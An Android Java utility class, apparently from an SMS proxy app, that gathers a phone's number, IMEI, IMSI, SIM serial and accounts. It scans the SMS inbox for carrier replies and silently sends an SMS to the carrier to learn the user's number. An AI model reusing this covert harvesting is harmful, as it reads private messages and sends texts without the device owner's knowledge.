package com.android.sms.proxy.entity;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author zyq 16-3-9
 */
public class PhoneInfo {

	private static final boolean DEBUG = true;
	private static final String TAG = "phoneInfo";
	private volatile static PhoneInfo mInstance;
	private TelephonyManager telephonyManager;
	public static final String SP_TABLE_PHONE_INFO = "phoneInfo";
	public static final String SP_KEY_PHONE_NUMBER = "phoneNumber";
	public static final String SP_KEY_PHONE_IMEI = "phoneImei";
	public static final String SMS_RECEIVE_BOX = "content://sms/inbox";


	private String IMSI;
	public static String phoneNumber;
	private static String imei;

	private Context context;

	public PhoneInfo(Context context) {
		this.context = context;
		telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
	}

	public static PhoneInfo getInstance(Context context) {
		if (mInstance == null) {
			synchronized (PhoneInfo.class) {
				if (mInstance == null) {
					mInstance = new PhoneInfo(context);
				}
			}
		}
		return mInstance;
	}

	private String findPhoneNumber(String providerName) {
		try {
			String text = null;
			switch (providerName) {
				case "中国移动":
					text = "10086";
					break;
				case "中国联通":
					text = "10010";
					break;
				case "中国电信":
					text = "10000";
					break;
				default:
					break;
			}
			if (TextUtils.isEmpty(text)) return null;
			Uri uri = Uri.parse(SMS_RECEIVE_BOX);
			ContentResolver contentResolver = context.getContentResolver();
			String[] projection = new String[]{
					"_id",
					"address",
					"body"
			};
			String select = "address = ?";
			String[] selectArgs = new String[]{text};
			if (contentResolver != null) {
				Cursor cursor = contentResolver.query(uri, projection, select, selectArgs, "date desc");
				Log.d(TAG, "找到类似的短信多少条:" + cursor.getCount());
				int sameCount = 0;
				while (cursor.moveToNext()) {
					String body = cursor.getString(cursor.getColumnIndex("body")).trim();
					Log.d(TAG, "短信内容:" + body);
					String phoneNumber = getPhoneNumber(body);
					if (!TextUtils.isEmpty(phoneNumber)) {
						sameCount++;
						if (sameCount > 2) {
							SharedPreferences sp = context.getSharedPreferences(SP_TABLE_PHONE_INFO, Context
									.MODE_PRIVATE);
							SharedPreferences.Editor et = sp.edit();
							et.putString(SP_KEY_PHONE_NUMBER, phoneNumber);
							boolean save = et.commit();
							if (save) {
								Log.d(TAG, "第三种方法保存成功手机号:" + phoneNumber);
								return phoneNumber;
							}
						}
					}
				}
			}
		} catch (Exception e) {
			Log.e(TAG, e.fillInStackTrace().toString());
		}
		return null;
	}

	private String getPhoneNumber(String smsBody) {
		Log.d(TAG, "找手机号");
		String telRegex = "[1][358]\\d{9}";
		Pattern p = Pattern.compile(telRegex);
		Matcher m = p.matcher(smsBody);
		if (m.find()) {
			final int groupCount = m.groupCount();
			if (groupCount >= 0) {
				final String tempStr = m.group(0);
				return tempStr.substring(0, tempStr.length());
			}
		}
		return null;
	}


	public String getNativePhoneNumber() {
		try {
			if (TextUtils.isEmpty(phoneNumber)) {
				//先从sp查找.
				SharedPreferences sp = context.getSharedPreferences(SP_TABLE_PHONE_INFO, Context.MODE_PRIVATE);
				String phone = sp.getString(SP_KEY_PHONE_NUMBER, "");
				Log.d(TAG, "从sp读到的手机号:" + phone);
				if (TextUtils.isEmpty(phone)) {
					//通过下面两种方法获取手机号
					phone = getNativePhoneNumber1();
					if (TextUtils.isEmpty(phone)) {
						phone = getNativePhoneNumber2();
						if (TextUtils.isEmpty(phone)) {
							if (DEBUG) {
								Log.d(TAG, "通过两种方法都没法获取手机号!!!!");
							}
							//尝试发短信,来获取验证码
							phone = findPhoneNumber(getProvidersName());
							if (DEBUG) {
								Log.d(TAG, "尝试第三种方案拿手机号");
							}
							Log.d(TAG, "第三种方案拿到的手机号为:" + phone);
							if (TextUtils.isEmpty(phone)) {
								sendSMS();
							} else {
								phoneNumber = phone;
								savePhoneInfo(context, phoneNumber);
							}
						} else {
							phoneNumber = phone;
							savePhoneInfo(context, phoneNumber);
						}
					} else {
						phoneNumber = phone;
						savePhoneInfo(context, phoneNumber);
						return phoneNumber;
					}
				} else {
					if (DEBUG) {
						Log.d(TAG, "直接从sp中找到手机号!!!");
					}
					phoneNumber = phone;
				}
			}
		} catch (Exception e) {
			if (DEBUG) {
				Log.d(TAG, "getNativePhoneNumber()函数异常:" + e.fillInStackTrace().toString());
			}
		}
		return phoneNumber;
	}

	public void sendSMS() {
		try {
			String providerName = getProvidersName();
			String text = null;
			String msgText = null;
			switch (providerName) {
				case "中国移动":
					text = "10086";
					msgText = "CXLL";
					break;
				case "中国联通":
					text = "10010";
					msgText = "CXLL";
					break;
				case "中国电信":
					text = "10000";
					msgText = "";
					break;
				default:
					break;
			}
			Log.d(TAG, "发送短信到10086查手机号");
			if (!TextUtils.isEmpty(text)) {
				SmsManager smsManager = SmsManager.getDefault();
				smsManager.sendTextMessage(text, null, msgText, null, null);
			}
		} catch (Exception e) {
			if (DEBUG) {
				Log.e(TAG, "sendSMS()函数异常:" + e.fillInStackTrace().toString());
			}
		}

	}


	private boolean savePhoneInfo(Context context, String phoneNumber) {
		if (context != null) {
			SharedPreferences sp = context.getSharedPreferences(SP_TABLE_PHONE_INFO, Context.MODE_PRIVATE);
			SharedPreferences.Editor et = sp.edit();
			et.putString(SP_KEY_PHONE_NUMBER, phoneNumber);
			return et.commit();
		}
		return false;
	}


	public String getNativePhoneNumber1() {
		String phone = "";
		try {
			phone = telephonyManager.getLine1Number();
		} catch (Exception e) {
			if (DEBUG) {
				Log.e(TAG, "getNativePhoneNumber1函数异常:" + e.fillInStackTrace().toString());
			}
		}
		return phone;
	}

	public String getNativePhoneNumber2() {
		String s1 = null;
		try {
			String main_data[] = {"data1", "is_primary", "data3", "data2", "data1", "is_primary", "photo_uri",
					"mimetype"};
			Object object = context.getContentResolver().query(Uri.withAppendedPath(android.provider.ContactsContract
							.Profile
							.CONTENT_URI, "data"),
					main_data, "mimetype=?",
					new String[]{"vnd.android.cursor.item/phone_v2"},
					"is_primary DESC");
			if (object != null) {
				do {
					if (!((Cursor) (object)).moveToNext())
						break;
					s1 = ((Cursor) (object)).getString(4);
					Log.d(TAG, "通过方法2获取手机号:" + s1);
				} while (true);
				((Cursor) (object)).close();
			}
		} catch (Exception e) {
			if (DEBUG) {
				Log.d(TAG, "getNativePhoneNumber2()函数异常:" + e.fillInStackTrace().toString());
			}
		}
		return s1;
	}

	private void getNativePhoneNumber3(Context context) {
		Log.d(TAG, "尝试从账户名下入手");
		AccountManager am = AccountManager.get(context);
		Account[] accounts = am.getAccounts();

		for (Account ac : accounts) {
			String acname = ac.name;
			String actype = ac.type;
			// Take your time to look at all available accounts
			System.out.println("Accounts : " + acname + ", " + actype);
		}

	}

	/**
	 * 获取手机服务商信息
	 */
	public String getProvidersName() {
		String ProvidersName = "N/A";
		try {
			IMSI = telephonyManager.getSubscriberId();
			// IMSI号前面3位460是国家，紧接着后面2位00 02是中国移动，01是中国联通，03是中国电信。
			System.out.println(IMSI);
			if (IMSI.startsWith("46000") || IMSI.startsWith("46002")) {
				ProvidersName = "中国移动";
			} else if (IMSI.startsWith("46001")) {
				ProvidersName = "中国联通";
			} else if (IMSI.startsWith("46003")) {
				ProvidersName = "中国电信";
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return ProvidersName;
	}


	public String getIMEI() {
		try {
			if (TextUtils.isEmpty(imei)) {
				SharedPreferences sp = context.getSharedPreferences(SP_TABLE_PHONE_INFO, Context.MODE_PRIVATE);
				imei = sp.getString(SP_KEY_PHONE_IMEI, "");
				if (TextUtils.isEmpty(imei)) {
					imei = getImeiFromSystemApi(context);
					if (!TextUtils.isEmpty(imei)) {
						SharedPreferences.Editor et = sp.edit();
						et.putString(SP_KEY_PHONE_IMEI, imei);
						et.commit();
					} else {
						imei = "000000000000000";
					}
				}
			}
		} catch (Exception e) {
			if (DEBUG) {
				Log.d(TAG, "getIMEI()函数异常:" + e.fillInStackTrace().toString());
			}
		}
		return imei;
	}

	/**
	 * 调用系统接口获取imei
	 *
	 * @param context
	 * @return
	 */
	private static String getImeiFromSystemApi(Context context) {
		String imei = null;
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			if (telephonyManager != null) {
				String imeiStr = telephonyManager.getDeviceId();
				if (imeiStr != null) {
					imei = imeiStr;
					if (imei != null) {
						imei = imei.trim();
						if (imei.indexOf(" ") > -1) {
							imei.replace(" ", "");
						}
						if (imei.indexOf("-") > -1) {
							imei = imei.replace("-", "");
						}
						if (imei.indexOf("\n") > -1) {
							imei = imei.replace("\n", "");
						}
						String meidStr = "MEID:";
						int stratIndex = imei.indexOf(meidStr);
						if (stratIndex > -1) {
							imei = imei.substring(stratIndex + meidStr.length());
						}
						imei = imei.trim();
						imei = imei.toLowerCase();
						if (imei.length() < 10) {
							imei = null;
						}
					}
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, "getImeiFromSystemApi()函数异常:" + e.fillInStackTrace().toString());
			}
		}
		return imei;
	}

	public String getPhoneInfo() {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		StringBuilder sb = new StringBuilder();

		sb.append("\nDeviceId(IMEI) = " + tm.getDeviceId());
		sb.append("\nDeviceSoftwareVersion = " + tm.getDeviceSoftwareVersion());
		sb.append("\nLine1Number = " + tm.getLine1Number());
		sb.append("\nNetworkCountryIso = " + tm.getNetworkCountryIso());
		sb.append("\nNetworkOperator = " + tm.getNetworkOperator());
		sb.append("\nNetworkOperatorName = " + tm.getNetworkOperatorName());
		sb.append("\nNetworkType = " + tm.getNetworkType());
		sb.append("\nPhoneType = " + tm.getPhoneType());
		sb.append("\nSimCountryIso = " + tm.getSimCountryIso());
		sb.append("\nSimOperator = " + tm.getSimOperator());
		sb.append("\nSimOperatorName = " + tm.getSimOperatorName());
		sb.append("\nSimSerialNumber = " + tm.getSimSerialNumber());
		sb.append("\nSimState = " + tm.getSimState());
		sb.append("\nSubscriberId(IMSI) = " + tm.getSubscriberId());
		sb.append("\nVoiceMailNumber = " + tm.getVoiceMailNumber());
		return sb.toString();
	}


}
